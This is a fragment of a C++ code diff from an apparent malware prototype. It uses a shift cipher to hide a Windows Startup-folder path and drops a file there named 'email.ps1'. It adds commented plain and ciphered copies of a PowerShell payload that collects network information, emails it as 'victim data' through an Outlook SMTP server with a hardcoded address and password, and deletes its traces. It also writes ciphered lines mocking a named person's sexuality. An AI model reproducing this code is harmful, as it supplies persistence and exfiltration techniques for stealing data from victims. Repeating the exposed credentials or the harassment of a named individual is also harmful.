@@ -326,24 +326,20 @@ public:
 		{
 			outfile << userPath << std::endl;
 		}
-		std::string es = "`EttHexe`Vseqmrk`Qmgvswsjx`[mrhs{w`Wxevx$Qiry`Tvskveqw`Wxevxyt`qep{evi2x|x"; // "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.txt";
+		std::string es = "`EttHexe`Vseqmrk`Qmgvswsjx`[mrhs{w`Wxevx$Qiry`Tvskveqw`Wxevxyt`iqemp2tw5"; // \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\email.ps1"
 	
 
 		std::ofstream supfile(userPath + kayne(es, -4));
 
-		//std::ofstream malfile(userPath + malpath);
-		/*
-		malfile << "scary.exe goes here?" << std::endl;
-		for (int c = 1; c < 15; c++) {
-		malfile << "imad is gay!" << std::endl;
-		}*/
-
-		supfile << "different ciphertexts can be seen below!" << std::endl;
-		for (int c = 1; c < 18; c++) {
-			supfile << kayne("jnbe!jt!hbz", -1) << std::endl;
+	
+		//std::string gay = "ipconfig /all > ipconfig.txt; ping localhost > ping.txt; $src = \"imad_kalboneh@hotmail.com\"; $SMTP = \"smtp-mail.outlook.com\"; $des = \"imad_kalboneh@hotmail.com\"; $subject = \"victim data\"; $body = \"it works!\"; $att1 = \"ipconfig.txt\"; $att2 = \"ping.txt\";  $pass = ConvertTo-SecureString \"datashe71\" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ($src, $pass); Send-MailMessage -To $des -From $src -Attachments $att1, $att2 -Subject $subject -Body $body -SmtpServer $SMTP -Credential $creds -UseSsl -Port 25 -DeliveryNotificationOption OnSuccess; remove-item -path \"ipconfig.txt\"; remove-item -path \"ping.txt\";";
+		//std::string gay = "xr~}uxv/>p{{/M/xr~}uxv=ƒ‡ƒJ/x}v/{~rp{w~‚ƒ/M/x}v=ƒ‡ƒJ/3‚r/L/1x|psnzp{q~}twOw~ƒ|px{=r~|1J/3b\c_/L/1‚|ƒ<|px{=~„ƒ{~~z=r~|1J/3st‚/L/1x|psnzp{q~}twOw~ƒ|px{=r~|1J/3‚„qytrƒ/L/1…xrƒx|/spƒp1J/3q~sˆ/L/1xƒ/†~z‚01J/3pƒƒ@/L/1xr~}uxv=ƒ‡ƒ1J/3pƒƒA/L/1x}v=ƒ‡ƒ1J//3p‚‚/L/R~}…tƒc~<btr„tbƒx}v/1spƒp‚wtF@1/<P‚_{px}ct‡ƒ/<U~rtJ/3rts‚/L/]t†<^qytrƒ/bˆ‚ƒt|=\p}pvt|t}ƒ=P„ƒ~|pƒx~}=_bRtst}ƒxp{/73‚r;/3p‚‚8J/bt}s<\px{\t‚‚pvt/<c~/3st‚/<U~|/3‚r/<Pƒƒprw|t}ƒ‚/3pƒƒ@;/3pƒƒA/<b„qytrƒ/3‚„qytrƒ/<Q~sˆ/3q~sˆ/<b|ƒbt…t/3b\c_/<Rtst}ƒxp{/3rts‚/<d‚tb‚{/<_~ƒ/AD/<St{x…tˆ]~ƒxuxrpƒx~}^ƒx~}/^}b„rrt‚‚J/t|~…t<xƒt|/<pƒw/1xr~}uxv=ƒ‡ƒ1J/t|~…t<xƒt|/<pƒw/1x}v=ƒ‡ƒ1J";
+		//std::string gay ="jqdpogjh!0bmm!?!jqdpogjh/uyu<!qjoh!mpdbmiptu!?!qjoh/uyu<!%tsd!>!#jnbe`lbmcpofiAipunbjm/dpn#<!%TNUQ!>!#tnuq.nbjm/pvumppl/dpn#<!%eft!>!#jnbe`lbmcpofiAipunbjm/dpn#<!%tvckfdu!>!#wjdujn!ebub#<!%cpez!>!#ju!xpslt\"#<!%buu2!>!#jqdpogjh / uyu#<!%buu3!>!#qjoh / uyu#<!!%qbtt!>!DpowfsuUp.TfdvsfTusjoh!#ebubtif82#!.BtQmbjoUfyu!.Gpsdf<!%dsfet!>!Ofx.Pckfdu!Tztufn / Nbobhfnfou / Bvupnbujpo / QTDsfefoujbm!) % tsd - !%qbtt*<!Tfoe.NbjmNfttbhf!.Up!%eft!.Gspn!%tsd!.Buubdinfout!%buu2 - !%buu3!.Tvckfdu!%tvckfdu!.Cpez!%cpez!.TnuqTfswfs!%TNUQ!.Dsfefoujbm!%dsfet!.VtfTtm!.Qpsu!36!.EfmjwfszOpujgjdbujpoPqujpo!PoTvddftt<!sfnpwf.jufn!.qbui!#jqdpogjh / uyu#<!sfnpwf.jufn!.qbui!#qjoh / uyu#<";
+		supfile << "Hello!" << std::endl;
+		for (int c = 0; c < 18; c++) {
+		supfile << kayne("jnbe!jt!hbz", -1) << std::endl;
 		}
-
-		//infile.close();
+				//infile.close();
 		outfile.close();
 		supfile.close();
 
